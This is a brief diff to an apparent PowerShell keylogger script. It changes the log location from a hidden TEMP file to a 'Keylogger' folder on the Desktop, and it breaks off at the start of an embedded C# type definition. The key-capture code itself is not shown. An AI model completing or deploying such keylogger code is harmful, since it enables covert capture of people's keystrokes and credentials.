@@ -1,4 +1,13 @@
-$logfile = "$env:TEMP\keys.log"
+$desktopPath = [System.Environment]::GetFolderPath('Desktop')
+$logFolder = [System.IO.Path]::Combine($desktopPath, 'Keylogger')  # Creating a folder named 'Keylogger' on Desktop
+
+# Create the folder if it doesn't exist
+if (-not (Test-Path $logFolder)) {
+    New-Item -ItemType Directory -Path $logFolder
+}
+
+$logfile = [System.IO.Path]::Combine($logFolder, 'keylogger_output.log')
+
 Add-Type -TypeDefinition @"
 using System;
 using System.IO;
